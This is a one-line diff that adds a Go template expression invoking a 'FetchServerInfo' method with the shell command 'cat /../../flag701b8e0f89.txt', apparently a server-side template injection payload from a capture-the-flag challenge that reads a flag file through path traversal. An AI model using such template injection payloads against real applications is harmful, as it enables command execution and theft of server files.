@@ -1,0 +1,1 @@
+{{.FetchServerInfo "cat /../../flag701b8e0f89.txt"}}
